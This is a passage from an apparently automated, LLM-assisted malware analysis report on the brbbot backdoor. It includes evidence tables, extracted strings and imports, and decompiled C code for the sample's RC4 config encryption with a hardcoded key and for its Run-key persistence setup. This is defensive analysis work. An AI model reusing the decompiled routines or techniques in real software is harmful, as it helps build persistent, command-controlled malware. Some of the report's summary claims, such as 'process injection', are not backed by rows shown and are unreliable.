| Persistence via Run key | malcat | Strings/registry | `Software\Microso..rrentVersion\Run` | Registry run key string present |
| Persistence confirmed | capa | All rules | `persist via Run registry key` | CAPA capability match for T1547.001 |
| HTTP C2 protocol | ghidra | Suspicious strings | `HTTP/1.1` | HTTP protocol string referenced in C2 function |
| Internet API usage | ida | Imports | `module: WININET, name: InternetOpenA` | WinINet API for network communication |
| Encryption capability | pe_imports | pe_imports | `crypto_encrypt with CryptEncrypt` | CryptoAPI encryption import |
| RC4 encryption with key | malcat | Decompilations | `sub_140002c50` | Decompilation shows RC4 with key `YnJiYm90` |
| Download capability | malcat | malcat_evidence | `DownloadUsingWininet` | YARA rule for WinINet download |
| Crypto API anomalies | malcat | Anomalies | `CryptoApiUsage` | 12 crypto API usage hits |
| RC4 via WinAPI | capa | top_rules | `encrypt data using RC4 via WinAPI` | CAPA confirms RC4 encryption method |
| Anti-debugging | pe_imports | pe_imports | `check_debugger with IsDebuggerPresent` | Anti-debug API import |

### 12.3 Audit Trail (Ghidra/IDA Queries)

The following SQL queries were executed during analysis (source: audit trail):

- `ghidra_query`: `SELECT addr AS address, name, size FROM funcs` — Function enumeration
- `ghidra_query`: `SELECT start_addr, end_addr, name FROM memory_blocks` — Memory layout
- `ghidra_query`: `SELECT addr, mnemonic, operands FROM instructions WHERE operands LIKE '%FS:%' OR operands LIKE '%GS:%'` — TEB/PEB access patterns
- `ghidra_query`: `SELECT addr, content FROM strings WHERE length < 300` — String extraction
- `ghidra_query`: `SELECT src_func_addr, dst_func_addr FROM call_edges` — Call graph analysis
- `ghidra_query`: `SELECT name, module FROM imports WHERE name LIKE 'Ordinal%'` — Ordinal import check
- `ida_query`: `SELECT COUNT(*) AS n FROM funcs` — Function count (225)
- `ida_query`: `SELECT name, addr, size FROM funcs ORDER BY size DESC LIMIT 3` — Largest functions
- `ida_query`: `SELECT content, printf("0x%X", addr) AS addr FROM strings WHERE content LIKE "%http%" LIMIT 3` — HTTP strings
- `ida_query`: `SELECT module, name, addr FROM imports LIMIT 3` — Import sampling

---

## 13. Appendix B: Analysis Environment

| Component | Details |
|---|---|
| Sample Path | `/opt/samples/corpus/malware/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/brbbot.exe` |
| Project | malware |
| Analysis Date | 2026-08-12 |
| LLM Model | mimo-v2.5-pro |
| Deep Dive Engine | langgraph |
| Frida Version | 17.16.4 |
| Speakeasy | Enabled, 0 events recorded |
| Goodware Corpus | Not staged (FP check skipped) |
| YARA Rule Generation | Enabled, 24 strings, valid |
| Sigma Rule Generation | Enabled |
| IOC Export | Enabled |
| Report Format | Technical Malware Analysis Report v2 |
| Evidence-First Mode | V5.16 — all claims cite source engine + address/rule |
## Appendix: Full Structured Evidence Pack

# Technical Evidence Pack

**sha256:** f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e  
**sample_path:** /opt/samples/corpus/malware/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e/brbbot.exe  
**project_name:** malware

> Every table below is copied from stage JSON. Technical narrative must cite these rows (engine + address/rule), not invent evidence.

## Verdict
- **verdict**: malicious
- **score**: 95
- **family_guess**: trojan.blocker/bckn (botnet trojan)
- **agreement**: llm_and_v1_agree
- **cross_engine_notes**: Ghidra and IDA confirm 225 functions and consistent crypto/HTTP imports. Malcat highlights persistence via registry run key and crypto anomalies. Capa maps to multiple ATT&CK techniques including persistence and encryption. YARA rules indicate network and downloader behaviors. External VT shows 57 malicious detections.
- **summary**: The sample brbbot.exe is malicious trojan exhibiting persistence via registry run keys, HTTP-based C2 communication, data encryption with hardcoded keys, and anti-debugging behaviors. Evidence is consistent across multiple analysis engines and supported by external threat intelligence with 57 VirusTotal detections.
- **source**: llm_judge
- **model**: mimo-v2.5-pro

### key_evidence (triage) — cite source field exactly
| source | query_or_table | row_or_rule | why |
|---|---|---|---|
| malcat | Strings/registry | `Software\Microso..rrentVersion\Run` | Indicates persistence by setting a registry run key, a common autostart mechanism for malware. |
| capa | All rules | `persist via Run registry key` | Confirms capability for persistence via registry run keys, mapped to ATT&CK T1547.001. |
| ghidra | Suspicious strings (Ghidra) | `HTTP/1.1` | Suggests HTTP protocol usage for communication, indicative of C2 activity. |
| ida | Imports (IDA) | `module: WININET, name: InternetOpenA` | API for establishing internet connections, enabling C2 beaconing or data exfiltration. |
| pe_imports | pe_imports | `crypto_encrypt with CryptEncrypt` | Encryption API used for data protection, obfuscation, or potential ransomware behavior. |
| malcat | Decompilations | `sub_140002c50` | Decompilation shows crypto operations with hardcoded key 'YnJiYm90' for config file encryption/decryption, suggesting C2 |
| malcat | malcat_evidence | `DownloadUsingWininet` | Rule matching indicates download functionality via WinINet, a common technique for malware payload retrieval. |
| malcat | Anomalies | `CryptoApiUsage` | Multiple crypto API usages detected, supporting encryption capabilities for evasion or data manipulation. |
| capa | top_rules | `encrypt data using RC4 via WinAPI` | Specific encryption method using RC4, often employed in malware for data obfuscation. |
| pe_imports | pe_imports | `check_debugger with IsDebuggerPresent` | Anti-debugging check to evade analysis, a defense evasion technique. |

## Deep-Dive Summary Evidence
- **source**: deep_dive_agentic
- **confidence**: 90
- **summary**: This is the 'brbbot' backdoor/RAT. It establishes persistence via the Windows Run registry key using the name 'brbbot', encrypts/decrypts its configuration file (brbconfig.tmp) using RC4 via the Windows Crypto API with a base64-encoded key 'YnJiYm90' (= 'brbbot'), communicates with a C2 server over HTTP/1.1 using a spoofed IE8 user-agent, and supports remote command execution via CreateProcessA. The binary includes anti-debug checks via ZwQuerySystemInformation and XOR-based data encoding. CAPA identified 35 capability matches covering encryption, persistence, network, and process injection techniques. YARA rules flagged anti-debug, network HTTP, screenshot capture, registry manipulation, dropper strings, and WinCrypt usage. Exfiltration was not observed based on CAPA's capability matches and YARA rule outputs {CAPA, capability matches, 'encryption, persistence, network, process injection', 'no exfiltration techniques listed'} {YARA, rules, 'anti-debug, network HTTP, screenshot capture, registry manipulation, dropper strings, WinCrypt usage', 'no exfiltration indicators'}. Credential access was not observed based on the same sources {CAPA, capability matches, 'encryption, persistence, network, process injection', 'no credential access techniques listed'} {YARA, rules, 'anti-debug, network HTTP, screenshot capture, registry manipulation, dropper strings, WinCrypt usage', 'no credential access indicators'}.

### deep key_evidence
- `"Ghidra string_refs: FUN_140002230 and FUN_140002550 reference 'Software\\Microsoft\\Windows\\CurrentVersion\\Run' with registry value name 'brbbot' \u2014 classic persistence mechanism"`
- `"Ghidra string_refs: FUN_140002230 references 'APPDATA' and 'brbconfig.tmp' \u2014 config file stored in user AppData"`
- `"Ghidra string_refs: FUN_140002940 and FUN_140002c50 reference 'Microsoft Enhanced Cryptographic Provider v1.0' and base64-encoded key 'YnJiYm90' (= 'brbbot') for RC4 encryption of config"`
- `"Ghidra imports: Full CryptoAPI chain \u2014 CryptAcquireContextW, CryptCreateHash, CryptHashData, CryptDeriveKey, CryptEncrypt, CryptDecrypt, CryptDestroyKey, CryptDestroyHash, CryptReleaseContext"`
- `"Ghidra imports: RegSetValueExA, RegOpenKeyExA, RegDeleteValueA, RegFlushKey, RegCloseKey \u2014 registry manipulation for persistence"`
- `"Ghidra imports: CreateProcessA, CreateFileA/W, CopyFileA, DeleteFileA, FindResourceA, GetModuleFileNameA \u2014 dropper/file operations and remote command execution"`
- `"Ghidra string_refs: FUN_140003030 references 'HTTP/1.1' and 'Connection: close\\r\\n' \u2014 C2 HTTP communication"`
- `"Ghidra string_refs: FUN_140002f50 references 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)' \u2014 spoofed user-agent for C2"`
- `"Ghidra string_refs: FUN_140003300 references 'ZwQuerySystemInformation' and 'ntdll.dll' \u2014 anti-analysis/process enumeration"`
- `"Ghidra string_refs: FUN_1400012e0 references 'encode' and 'sleep' \u2014 data encoding and C2 sleep/beacon loop"`
- `"CAPA: 35 rules matched including 'encode data using XOR' (T1027), 'encrypt or decrypt via WinCrypt' (T1027), 'encrypt data using RC4 via WinAPI' (C0027.009), 'create new key via CryptAcquireContext'"`
- `"YARA: 17 rules matched including anti_dbg, network_http, screenshot, win_registry, win_files_operation, Dropper_Strings, Advapi_Hash_API, contains_base64"`
- `"Ghidra function_metrics: FUN_1400012e0 has cyclomatic_complexity=59, call_out_count=37, string_ref_count=2 \u2014 complex C2 command dispatcher; FUN_140001840 cc=45, call_out=24; FUN_140001c10 cc=47, call_out=28 \u2014 multi-path logic with high branching"`

## Malcat Structured Analysis
### Malcat File Summary
```
sha256: f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e
size: 75776
type: PE
architecture: X64
entrypoint_ea: 13204
entropy: 5.92
file_name: brbbot.exe
```

### File Layout (sections/regions)
| Name | EA | Physical | Virtual | Entropy | Rights |
|---|---|---|---|---|---|
| header | 0 | 1024 | 0 | 49 | - |
| .text | 1024 | 50176 | 53248 | 136 | RX |
| .rdata | 54272 | 14848 | 16384 | 73 | R |
| .data | 70656 | 5120 | 16384 | 77 | RW |
| .pdata | 87040 | 3072 | 4096 | 32 | R |
| .rsrc | 91136 | 512 | 4096 | 5 | R |
| .reloc | 95232 | 1024 | 4096 | 18 | R |

### Malcat YARA / Signatures (6)
| Rule | Category | Type | Reliability | Description |
|---|---|---|---|---|
| MSVC_2010_linker | compiler | INFO | 60 | detects used visual studio version based on linker information |
| msvs2010_rich | compiler | INFO | 80 | detects used visual studio version based on rich header information |
| DownloadUsingWininet | network | UNCOMMON | 60 | can download files from internet using wininet API |
| CustomUserAgent | network | UNCOMMON | 30 | embeds a user agent string |
| AutorunKey | persistence | UNCOMMON | 20 | file contains path of an autorun key |
| msvc_general_x64 | compiler | INFO | 50 |  |

### Anomalies (7)
| Name | Level | Category | Hits | Description |
|---|---|---|---|---|
| ManyUniqueImmediateBytes | 3 | code | 2 | More than 48 unique bytes defined across all immediate operands in the function |
| XorInLoop | 3 | code | 9 | XOR instruction in a loop |
| CryptoApiUsage | 2 | imports | 12 | Crypto-related apis are used |
| DownloaderApiUsage | 2 | imports | 2 | Downloader-related apis are used |
| HighXrefLoopingFunction | 1 | code | 1 | Function contains a loop and has a lot of incoming references (string decryption candidate) |
| NoChecksum | 1 | integrity | 1 | PE Header checksum is not set |
| SpaghettiFunction | 1 | code | 8 | Function with lots of intra jumps, could be obfuscated |

### Anomaly Locations (high-signal)
- **CryptoApiUsage**
  - `8247`: 
  - `9024`: 
  - `8210`: 
  - `8987`: 
  - `7769`: 
- **HighXrefLoopingFunction**
  - `14512`: 
- **ManyUniqueImmediateBytes**
  - `14940`: 
  - `20544`: 
- **NoChecksum**
  - `320`: 
- **SpaghettiFunction**
  - `11040`: 
  - `11584`: 
  - `19152`: 
  - `20544`: 
  - `29576`: 
- **XorInLoop**
  - `4320`: 
  - `4768`: 
  - `11105`: 
  - `11616`: 
  - `11793`: 

### High-Signal Strings (18 matched keywords; engine=malcat)
| EA | String |
|---|---|
| 61792 | `GetProcessWindowStation` |
| 62320 | `HTTP/1.1` |
| 67660 | `KERNEL32.dll` |
| 66764 | `CryptReleaseContext` |
| 66820 | `CryptDestroyKey` |
| 66802 | `CryptCreateHash` |
| 67036 | `HttpOpenRequestA` |
| 66838 | `CryptDecrypt` |
| 66786 | `CryptEncrypt` |
| 66722 | `CryptAcquireContextW` |
| 66746 | `CryptDeriveKey` |
| 67608 | `GetProcAddress` |
| 66854 | `CryptDestroyHash` |
| 67056 | `HttpSendRequestA` |
| 68606 | `LoadLibraryW` |
| 66874 | `CryptHashData` |
| 67186 | `GetProcessHeap` |
| 66976 | `HttpQueryInfoA` |

### Top Strings (254 extracted; showing 80)
| EA | String |
|---|---|
| 62256 | `Mozilla/4.0 (com...1; Trident/4.0)` |
| 62080 | `Software\Microso..rrentVersion\Run` |
| 62144 | `Microsoft Enhanc..ic Provider v1.0` |
| 56576 | `mscoree.dll` |
| 62392 | `ntdll.dll` |
| 61904 | `USER32.DLL` |
| 66934 | `InternetReadFile` |
| 55488 | `HH:mm:ss` |
| 61792 | `GetProcessWindowStation` |
| 62072 | `APPDATA` |
| 61816 | `GetUserObjectInformationW` |
| 62360 | `ZwQuerySystemInformation` |
| 55512 | `dddd, MMMM dd, yyyy` |
| 61952 | `brbconfig.tmp` |
| 62336 | `Connection: close
` |
| 61848 | `GetLastActivePopup` |
| 62048 | `%s?i=%s&c=%s&p=%s` |
| 56560 | `CorExitProcess` |
| 61872 | `GetActiveWindow` |
| 62320 | `HTTP/1.1` |
| 61928 | `CONOUT$` |
| 61984 | `exec` |
| 62408 | `Idle` |
| 61888 | `MessageBoxW` |
| 62016 | `sleep` |
| 62024 | `encode` |
| 62128 | `brbbot` |
| 75752 | `#3#or%5452o#8A` |
| 67090 | `WININET.dll` |
| 55552 | `MM/dd/yy` |
| 61944 | `CONFIG` |
| 61992 | `file` |
| 62000 | `conf` |
| 62008 | `exit` |
| 67660 | `KERNEL32.dll` |
| 67102 | `WS2_32.dll` |
| 66888 | `ADVAPI32.dll` |
| 61968 | `YnJiYm90` |
| 67682 | `USER32.dll` |
| 56600 | `runtime error ` |
| 59984 | `         (((((  ..               H` |
| 55592 | `December` |
| 62036 | `%02x` |
| 56128 | `MM/dd/yy` |
| 56088 | `HH:mm:ss` |
| 55960 | `Wednesday` |
| 55656 | `September` |
| 55896 | `Saturday` |
| 55784 | `January` |
| 55760 | `February` |
| 55680 | `August` |
| 55616 | `November` |
| 55376 | `(null)` |
| 56104 | `dddd, MMMM dd, yyyy` |
| 55984 | `Tuesday` |
| 56152 | `December` |
| 55936 | `Thursday` |
| 55640 | `October` |
| 56000 | `Monday` |
| 56360 | `Wednesday` |
| 55728 | `April` |
| 55744 | `March` |
| 56192 | `September` |
| 55920 | `Friday` |
| 56016 | `Sunday` |
| 55696 | `July` |
| 55712 | `June` |
| 56204 | `August` |
| 56320 | `Saturday` |
| 56168 | `November` |
| 56248 | `February` |
| 56264 | `January` |
| 55360 | `(null)` |
| 60498 | `         h((((  ..               H` |
| 56184 | `October` |
| 56376 | `Tuesday` |
| 56344 | `Thursday` |
| 56220 | `June` |
| 56392 | `Sunday` |
| 56384 | `Monday` |

### Constants / Known Patterns (28)
| Category | Value |
|---|---|
| registry | `registry::HKEY_LOCAL_MACHINE` |
| exception | `exception::C++ exception` |
| exception | `exception::FuncInfo header` |
| runtime | `runtime::msvc_tloss_error` |
| runtime | `runtime::msvc_sing_error` |
| runtime | `runtime::msvc_domain_error` |
| runtime | `runtime::msvc_r6033` |
| runtime | `runtime::msvc_r6032` |
| runtime | `runtime::msvc_r6031` |
| runtime | `runtime::msvc_r6030` |
| runtime | `runtime::msvc_r6028` |
| runtime | `runtime::msvc_r6027` |
| runtime | `runtime::msvc_r6026` |
| runtime | `runtime::msvc_r6025` |
| runtime | `runtime::msvc_r6024` |
| runtime | `runtime::msvc_r6019` |
| runtime | `runtime::msvc_r6018` |
| runtime | `runtime::msvc_r6017` |
| runtime | `runtime::msvc_r6016` |
| runtime | `runtime::msvc_r6010` |
| runtime | `runtime::msvc_r6009` |
| runtime | `runtime::msvc_r6008` |
| runtime | `runtime::msvc_r6002` |
| runtime | `runtime::msvc_rl` |
| runtime | `runtime::msvc_name_unknown` |
| runtime | `runtime::msvc_runtime_error` |
| registry | `registry::autorun` |
| crypto | `crypto::crypto_provider` |

### Imports (276)
| EA | Name | Type | Refs |
|---|---|---|---|
| 10640 | __security_check_cookie | DEBUG | 19 |
| 10672 | vscan_fn | DEBUG | 2 |
| 10896 | strstr | DEBUG | 2 |
| 10984 | strchr | DEBUG | 7 |
| 11040 | strncpy | DEBUG | 10 |
| 11396 | sprintf | DEBUG | 4 |
| 11584 | strncat | DEBUG | 5 |
| 12016 | strncmp | DEBUG | 5 |
| 12200 | _LocaleUpdate._LocaleUpdate | DEBUG | 15 |
| 12364 | isdigit | DEBUG | 9 |
| 12492 | isxdigit | DEBUG | 3 |
| 12624 | isspace | DEBUG | 5 |
| 12752 | strrchr | DEBUG | 2 |
| 12792 | __tmainCRTStartup | DEBUG | 2 |
| 13204 | mainCRTStartup | DEBUG | 2 |
| 13224 | __report_gsfailure | DEBUG | 2 |
| 13584 | strlen | DEBUG | 4 |
| 13760 | _call_reportfault | DEBUG | 3 |
| 14092 | _invoke_watson | DEBUG | 8 |
| 14144 | _invalid_parameter | DEBUG | 2 |
| 14256 | _invalid_parameter_noinfo | DEBUG | 32 |
| 14288 | _get_errno_from_oserr | DEBUG | 4 |
| 14360 | _errno | DEBUG | 80 |
| 14392 | __doserrno | DEBUG | 26 |
| 14424 | _dosmaperr | DEBUG | 7 |
| 14512 | memset | DEBUG | 33 |
| 14748 | __check_float_string | DEBUG | 7 |
| 14940 | _input_l | DEBUG | 2 |
| 19152 | strtoxl | DEBUG | 3 |
| 19772 | strtol | DEBUG | 2 |
| 19820 | _flsbuf | DEBUG | 4 |
| 20220 | write_char | DEBUG | 6 |
| 20292 | write_multi_char | DEBUG | 4 |
| 20376 | write_string | DEBUG | 4 |
| 20544 | _output_l | DEBUG | 2 |
| 23204 | setSBCS | DEBUG | 2 |
| 23344 | setSBUpLow | DEBUG | 3 |
| 23840 | __updatetmbcinfo | DEBUG | 4 |
| 24028 | getSystemCP | DEBUG | 3 |
| 24172 | _setmbcp_nolock | DEBUG | 3 |
| 24804 | _setmbcp | DEBUG | 2 |
| 25284 | __initmbctable | DEBUG | 2 |
| 25324 | __addlocaleref | DEBUG | 3 |
| 25464 | __removelocaleref | DEBUG | 2 |
| 25628 | __freetlocinfo | DEBUG | 3 |
| 26008 | _updatetlocinfoEx_nolock | DEBUG | 2 |
| 26096 | __updatetlocinfo | DEBUG | 2 |
| 26228 | _mtterm | DEBUG | 2 |
| 26268 | _initptd | DEBUG | 3 |
| 26452 | _getptd_noexit | DEBUG | 8 |
| 26584 | _getptd | DEBUG | 9 |
| 26620 | _freefls | DEBUG | 3 |
| 26928 | _mtinit | DEBUG | 2 |
| 27060 | _isctype_l | DEBUG | 5 |
| 27292 | __CxxUnhandledExceptionFilter | DEBUG | 3 |
| 27360 | __CxxSetUnhandledExceptionFilter | DEBUG | 2 |
| 27384 | __crtCorExitProcess | DEBUG | 4 |
| 27468 | _lockexit | DEBUG | 1 |
| 27480 | _unlockexit | DEBUG | 2 |
| 27492 | _init_pointers | DEBUG | 2 |
| 27560 | _initterm | DEBUG | 3 |
| 27612 | _initterm_e | DEBUG | 2 |
| 27672 | _cinit | DEBUG | 2 |
| 27848 | doexit | DEBUG | 6 |
| 28260 | _exit | DEBUG | 3 |
| 28272 | _cexit | DEBUG | 1 |
| 28288 | _c_exit | DEBUG | 1 |
| 28304 | _amsg_exit | DEBUG | 10 |
| 28344 | _GET_RTERRMSG | DEBUG | 1 |
| 28388 | _NMSG_WRITE | DEBUG | 8 |
| 28996 | _FF_MSGBANNER | DEBUG | 6 |
| 29064 | __C_specific_handler | DEBUG | 1 |
| 29576 | _XcptFilter | DEBUG | 2 |
| 30040 | _wwincmdln | DEBUG | 2 |
| 30128 | _wsetenvp | DEBUG | 2 |
| 30440 | wparse_cmdline | DEBUG | 3 |
| 30848 | _wsetargv | DEBUG | 3 |
| 31088 | __crtGetEnvironmentStringsW | DEBUG | 3 |
| 31224 | _ioinit | DEBUG | 2 |
| 32060 | _heap_init | DEBUG | 3 |

### Functions (30)
| EA | Name |
|---|---|
| 8272 | sub_140002c50 |
| 7488 | sub_140002940 |
| 5680 | sub_140002230 |
| 6480 | sub_140002550 |
| 45040 | sub_14000bbf0 |
| 4112 | sub_140001c10 |
| 42192 | sub_14000b0d0 |
| 43908 | sub_14000b784 |
| 1760 | sub_1400012e0 |
| 9984 | sub_140003300 |
| 1360 | sub_140001150 |
| 3136 | sub_140001840 |
| 9472 | sub_140003100 |
| 5040 | sub_140001fb0 |
| 7104 | sub_1400027c0 |
| 1024 | sub_140001000 |
| 2928 | sub_140001770 |
| 9264 | sub_140003030 |
| 9040 | sub_140002f50 |
| 49396 | sub_14000ccf4 |
| 27444 | sub_140007734 |
| 50515 | sub_14000d153 |
| 26216 | sub_140007268 |
| 42684 | sub_14000b2bc |
| 50316 | jmp_kernel32.RtlVirtualUnwind |
| 50322 | jmp_kernel32.RtlLookupFunctionEntry |
| 50328 | jmp_kernel32.RtlUnwindEx |
| 31948 | sub_1400088cc |
| 32004 | sub_140008904 |
| 44992 | sub_14000bbc0 |

### Decompilations (top 6)
#### 8272 — sub_140002c50
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

uint32_t sub_140002c50(int64_t *param_1,int32_t *param_2)

{
    uint32_t uVar1;
    int32_t iVar2;
    int64_t iVar3;
    undefined8 uVar4;
    int64_t iVar5;
    int64_t iVar6;
    char cVar7;
    uint32_t auStackX_18 [2];
    int64_t iStackX_20;
    undefined8 in_stack_ffffffffffffffa8;
    uint64_t uVar8;
    undefined4 uVar9;
    int64_t iStack_38;
    int64_t iStack_30;
    
    uVar1 = 0;
    iStack_30 = 0;
    iStack_38 = 0;
    iStackX_20 = 0;
    uVar8 = CONCAT44(in_stack_ffffffffffffffa8 >> 0x20, 3);
    iVar3 = (*kernel32.CreateFileA)("brbconfig.tmp", 1, 1, 0, uVar8, 0x80, 0);
    if (iVar3 == -1) {
        uVar1 = (*kernel32.GetLastError)();
        if (0 < uVar1) {
            uVar1 = uVar1 & 0xffff | 0x80070000;
        }
    }
    else {
        iVar2 = (*kernel32.GetFileSize)(iVar3, 0);
        *param_2 = iVar2 + 1;
        uVar4 = (*kernel32.GetProcessHeap)();
        iVar5 = (*kernel32.HeapAlloc)(uVar4, 8, iVar2 + 1);
        uVar8 = uVar8 & 0xffffffff00000000;
        *param_1 = iVar5;
        iVar2 = (*advapi32.CryptAcquireContextW)(&iStackX_20, 0, &crypto_provider, 1, uVar8);
        uVar9 = uVar8 >> 0x20;
        if (iVar2 == 0) {
            (*kernel32.GetLastError)();
        }
        iVar2 = (*kernel32.GetLastError)();
        if ((((iVar2 == -0x7ff6ffea) &&
             (iVar2 = (*advapi32.CryptAcquireContextW)(&iStackX_20, 0, &crypto_provider, 1, CONCAT44(uVar9, 8)),
             iVar2 == 0)) || (iVar2 = (*advapi32.CryptCreateHash)(iStackX_20, 0x8003, 0, 0, &iStack_38), iVar2 == 0)) ||
           ((iVar2 = (*advapi32.CryptHashData)(iStack_38, "YnJiYm90", 8), iVar2 == 0 ||
            (iVar2 = (*advapi32.CryptDeriveKey)(iStackX_20, 0x6801, iStack_38, 0x800000, &iStack_30), iVar2 == 0)))) {
            uVar1 = (*kernel32.GetLastError)();
            if (0 < uVar1) {
                uVar1 = uVar1 & 0xffff | 0x80070000;
            }
        }
        else {
            uVar4 = (*kernel32.GetProcessHeap)();
            iVar6 = (*kernel32.HeapAlloc)(uVar4, 8, 1000);
            if (iVar6 == 0) {
                uVar1 = 0x8007000e;
            }
            else {
                cVar7 = '\0';
                do {
                    iVar2 = (*kernel32.ReadFile)(iVar3, iVar6, 1000, auStackX_18, 0);
                    if (iVar2 == 0) {
code_r0x000140002ebc:
                        uVar1 = (*kernel32.GetLastError)();
                        if (0 < uVar1) {
                            uVar1 = uVar1 & 0xffff | 0x80070000;
                        }
                        break;
                    }
                    if (auStackX_18[0] < 1000) {
                        cVar7 = '\x01';
                    }
                    if (auStackX_18[0] == 0) break;
                    iVar2 = (*advapi32.CryptDecrypt)(iStack_30, 0, cVar7, 0, iVar6, auStackX_18);
                    if (iVar2 == 0) goto code_r0x000140002ebc;
                    memmove(iVar5, iVar6, auStackX_18[0]);
                    memset(iVar6, 0, 1000);
                    iVar5 = iVar5 + auStackX_18[0];
                } while (cVar7 == '\0');
                uVar4 = (*kernel32.GetProcessHeap)();
                (*kernel32.HeapFree)(uVar4, 0, iVar6);
            }
        }
        if (iVar3 == 0) goto code_r0x000140002efa;
    }
    (*kernel32.CloseHandle)(iVar3);
code_r0x000140002efa:
    if (iStack_38 != 0) {
        (*advapi32.CryptDestroyHash)();
    }
    if (iStack_30 != 0) {
        (*advapi32.CryptDestroyKey)();
    }
    if (iStackX_20 != 0) {
        (*advapi32.CryptReleaseContext)(iStackX_20, 0);
    }
    return uVar1;
}

```
#### 7488 — sub_140002940
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

uint64_t sub_140002940(int64_t param_1,int32_t param_2)

{
    uint32_t uVar1;
    int32_t iVar2;
    int64_t iVar3;
    undefined8 uVar4;
    uint64_t uVar5;
    uint64_t uVar6;
    char cVar7;
    int64_t iVar8;
    uint32_t auStackX_18 [2];
    int64_t iStackX_20;
    undefined8 in_stack_ffffffffffffffa8;
    uint64_t uVar9;
    undefined4 uVar10;
    undefined8 uVar11;
    int64_t iStack_38;
    int64_t iStack_30;
    
    uVar6 = 0;
    uVar11 = 0;
    iStackX_20 = 0;
    iStack_30 = 0;
    iStack_38 = 0;
    uVar9 = CONCAT44(in_stack_ffffffffffffffa8 >> 0x20, 2);
    iVar3 = (*kernel32.CreateFileA)("brbconfig.tmp", 2, 1, 0, uVar9, 0x80, 0);
    uVar5 = uVar6;
    if (iVar3 == -1) {
        uVar1 = (*kernel32.GetLastError)();
        uVar6 = uVar1;
        if (0 < uVar1) {
            uVar6 = uVar1 & 0xffff | 0x80070000;
            uVar5 = 0;
        }
    }
    else {
        uVar9 = uVar9 & 0xffffffff00000000;
        iVar2 = (*advapi32.CryptAcquireContextW)(&iStackX_20, 0, &crypto_provider, 1, uVar9);
        uVar10 = uVar9 >> 0x20;
        if (iVar2 == 0) {
            (*kernel32.GetLastError)();
        }
        iVar2 = (*kernel32.GetLastError)();
        if ((((iVar2 == -0x7ff6ffea) &&
             (iVar2 = (*advapi32.CryptAcquireContextW)(&iStackX_20, 0, &crypto_provider, 1, CONCAT44(uVar10, 8)),
             iVar2 == 0)) || (iVar2 = (*advapi32.CryptCreateHash)(iStackX_20, 0x8003, 0, 0, &iStack_38), iVar2 == 0)) ||
           ((iVar2 = (*advapi32.CryptHashData)(iStack_38, "YnJiYm90", 8), iVar2 == 0 ||
            (iVar2 = (*advapi32.CryptDeriveKey)(iStackX_20, 0x6801, iStack_38, 0x800000, &iStack_30), iVar2 == 0)))) {
            uVar1 = (*kernel32.GetLastError)();
            uVar6 = uVar1;
            if (0 < uVar1) {
                uVar6 = uVar1 & 0xffff | 0x80070000;
                uVar5 = 0;
            }
        }
        else {
            uVar4 = (*kernel32.GetProcessHeap)();
            uVar5 = (*kernel32.HeapAlloc)(uVar4, 8, 0x3f0);
            if (uVar5 == 0) {
                uVar6 = 0x8007000e;
            }
            else {
                cVar7 = '\0';
                iVar8 = param_1;
                do {
                    uVar10 = uVar11 >> 0x20;
                    auStackX_18[0] = (param_1 - iVar8) + param_2;
                    if (auStackX_18[0] < 1000) {
                        memmove(uVar5, iVar8, auStackX_18[0]);
                        cVar7 = '\x01';
                    }
                    else {
                        auStackX_18[0] = 1000;
                    }
                    memmove(uVar5, iVar8, auStackX_18[0]);
                    uVar11 = CONCAT44(uVar10, 0x3f0);
                    iVar2 = (*advapi32.CryptEncrypt)(iStack_30, 0, cVar7, 0, uVar5, auStackX_18, uVar11);
                    if ((iVar2 == 0) ||
                       (iVar2 = (*kernel32.WriteFile)(iVar3, uVar5, auStackX_18[0], auStackX_18, 0), iVar2 == 0)) {
                        uVar1 = (*kernel32.GetLastError)();
                        if (uVar1 < 1) {
                            uVar6 = uVar1;
                        }
                        else {
                            uVar6 = uVar1 & 0xffff | 0x80070000;
                        }
                        break;
                    }
                    iVar8 = iVar8 + 1000;
                } while (cVar7 == '\0');
            }
        }
        if (iVar3 == 0) goto code_r0x000140002bd5;
    }
    (*kernel32.CloseHandle)(iVar3);
code_r0x000140002bd5:
    if (uVar5 != 0) {
        uVar11 = (*kernel32.GetProcessHeap)();
        (*kernel32.HeapFree)(uVar11, 8, uVar5);
    }
    if (iStack_38 != 0) {
        (*advapi32.CryptDestroyHash)();
    }
    if (iStack_30 != 0) {
        (*advapi32.CryptDestroyKey)();
    }
    if (iStackX_20 != 0) {
        (*advapi32.CryptReleaseContext)(iStackX_20, 0);
    }
    return uVar6;
}

```
#### 5680 — sub_140002230
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

void sub_140002230(void)

{
    char cVar1;
    bool bVar2;
    int32_t iVar3;
    uint32_t uVar4;
    undefined8 uVar5;
    char *pcVar6;
    int64_t iVar7;
    int64_t *piVar8;
    uint64_t uVar9;
    uint64_t uVar10;
    int64_t iVar11;
    char *pcVar12;
    int64_t *piVar13;
    undefined auStack_288 [32];
    int64_t *piStack_268;
    uint32_t uStack_260;
    int64_t aiStack_258 [2];
    char acStack_248 [272];
    undefined uStack_138;
    undefined auStack_137 [271];
    uint64_t uStack_28;
    
    uStack_28 = [0x0x140012008] ^ auStack_288;
    uVar4 = 0x8000ffff;
    uStack_138 = 0;
    memset(auStack_137, 0, 0x103);
    acStack_248[0] = '\0';
    memset(acStack_248 + 1, 0, 0x103);
    aiStack_258[0] = 0;
    piVar8 = 0x0;
    bVar2 = false;
    uVar5 = (*kernel32.GetModuleHandleW)(0);
    iVar3 = (*kernel32.GetModuleFileNameA)(uVar5, &uStack_138, 0x104);
    if (iVar3 == 0) {
        uVar4 = (*kernel32.GetLastError)();
        if (0 < uVar4) {
            uVar4 = uVar4 & 0xffff | 0x80070000;
            bVar2 = false;
        }
    }
    else {
        pcVar6 = strrchr(&uStack_138, 0x5c);
        iVar3 = (*kernel32.GetEnvironmentVariableA)("APPDATA", acStack_248, 0x104);
        if (iVar3 != 0) {
            iVar7 = strstr(&uStack_138, acStack_248);
            uVar9 = 0xffffffffffffffff;
            pcVar12 = pcVar6;
            do {
                if (uVar9 == 0) break;
                uVar9 = uVar9 - 1;
                cVar1 = *pcVar12;
                pcVar12 = pcVar12 + 1;
